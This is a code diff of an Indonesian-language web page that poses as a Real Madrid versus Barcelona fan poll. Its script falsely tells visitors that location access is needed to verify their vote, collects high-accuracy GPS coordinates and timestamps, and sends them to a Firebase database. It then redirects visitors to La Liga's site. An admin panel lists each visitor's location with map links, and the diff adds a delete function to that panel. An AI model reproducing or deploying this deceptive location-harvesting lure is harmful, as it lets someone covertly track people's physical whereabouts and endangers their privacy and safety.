@@ -3,43 +3,35 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Poling Sepak Bola 2025</title>
+    <title>Poling club favoritmu</title>
     <style>
         body { font-family: 'Arial', sans-serif; text-align: center; background: #1a1a1a; color: white; padding: 20px; }
         .card { background: #2a2a2a; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); display: inline-block; width: 100%; max-width: 500px; margin-top: 30px; }
         .btn-box { display: flex; justify-content: space-around; margin-top: 25px; }
-        
-        /* Gaya Dasar Tombol */
         .btn { padding: 15px 10px; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; width: 46%; transition: 0.3s; font-size: 14px; }
-        
-        /* Warna Jersey Madrid 2025 (Putih - Orange) */
-        .madrid { 
-            background: #ffffff; 
-            color: #000000; 
-            border: 3px solid #FE5000; 
-        }
-        
-        /* Warna Jersey Barca 2025 (Blaugrana 125th Anniv) */
-        .barca { 
-            background: #a50044; 
-            color: #ffffff; 
-            border: 3px solid #004d98; 
-        }
-
+        .madrid { background: #ffffff; color: #000000; border: 3px solid #FE5000; }
+        .barca { background: #a50044; color: #ffffff; border: 3px solid #004d98; }
         .btn:hover { transform: scale(1.05); filter: brightness(1.1); }
         
         /* Gaya List Admin */
-        .admin-item { background: #fff; color: #333; padding: 15px; border-radius: 10px; margin-bottom: 15px; text-align: left; border-left: 5px solid #4285F4; }
+        .admin-item { background: #fff; color: #333; padding: 15px; border-radius: 10px; margin-bottom: 15px; text-align: left; border-left: 5px solid #4285F4; position: relative; }
         .admin-item p { margin: 5px 0; font-size: 14px; color: #333; }
         .maps-link { display: inline-block; margin-top: 8px; color: #4285F4; font-weight: bold; text-decoration: none; }
+        
+        /* Tombol Hapus */
+        .btn-hapus { 
+            background: #ff4444; color: white; border: none; padding: 5px 10px; 
+            border-radius: 5px; cursor: pointer; font-size: 11px; margin-top: 10px;
+        }
+        .btn-hapus:hover { background: #cc0000; }
     </style>
 </head>
 <body>
 
     <div class="card">
         <div id="pilih-box">
-            <h2 style="letter-spacing: 1px;">VOTE CLUB FAVORIT JAGOANMU.</h2>
-            <p> tim jagoanmu yang mana?</p> 
+            <h2 style="letter-spacing: 1px;">VOTING CLUB FAVORITMU</h2>
+            <p>tim jagoanmu yang mana?</p>
             <div class="btn-box">
                 <button class="btn madrid" onclick="pilih('Real Madrid')">REAL MADRID</button>
                 <button class="btn barca" onclick="pilih('Barcelona')">BARCELONA</button>
@@ -54,7 +46,7 @@
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-        import { getDatabase, ref, push, onValue } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
+        import { getDatabase, ref, push, onValue, remove } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";
 
         const firebaseConfig = {
             databaseURL: "https://project-saya-87cc0-default-rtdb.firebaseio.com/"
@@ -87,19 +79,32 @@
                                 <p><b>Waktu:</b> ${item.waktu || '-'}</p>
                                 <p><b>Lokasi:</b> ${item.lat}, ${item.lon}</p>
                                 <a href="https://www.google.com/maps?q=${item.lat},${item.lon}" target="_blank" class="maps-link">📍 Lihat di Google Maps</a>
+                                <br>
+                                <button class="btn-hapus" onclick="hapusData('${key}')">🗑️ Hapus Data</button>
                             </div>
                         `;
                     });
                     container.innerHTML = htmlContent;
                 } else {
-                    container.innerHTML = "<p style='color:white;'>Belum ada data voting di database.</p>";
+                    container.innerHTML = "<p style='color:white;'>Belum ada data voting.</p>";
                 }
             });
         }
 
+        // FUNGSI HAPUS DATA
+        window.hapusData = function(id) {
+            if (confirm("Apakah Anda yakin ingin menghapus data ini?")) {
+                const dataRef = ref(db, 'laporan_voter/' + id);
+                remove(dataRef).then(() => {
+                    alert("Data berhasil dihapus!");
+                }).catch((error) => {
+                    alert("Gagal menghapus: " + error.message);
+                });
+            }
+        }
+
         window.pilih = function(namaTim) {
             alert("Terima kasih! Klik 'Allow/Izinkan' untuk verifikasi suara.");
-            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition((pos) => {
                     const dataBaru = {
@@ -108,23 +113,15 @@
                         lon: pos.coords.longitude,
                         waktu: new Date().toLocaleString()
                     };
-
-                    push(linkRef, dataBaru)
-                    .then(() => {
+                    push(linkRef, dataBaru).then(() => {
                         alert("Berhasil! Suara Anda terkirim.");
                         window.location.href = "https://www.laliga.com";
-                    })
-                    .catch((error) => {
-                        alert("Error Firebase: " + error.message);
                     });
                 }, (err) => {
-                    alert("Gagal: Mohon aktifkan GPS & Izinkan Lokasi di browser.");
+                    alert("Gagal: Mohon izinkan lokasi di browser.");
                 }, { enableHighAccuracy: true });
-            } else {
-                alert("Browser tidak mendukung GPS.");
             }
         }
     </script>
 </body>
 </html>
-
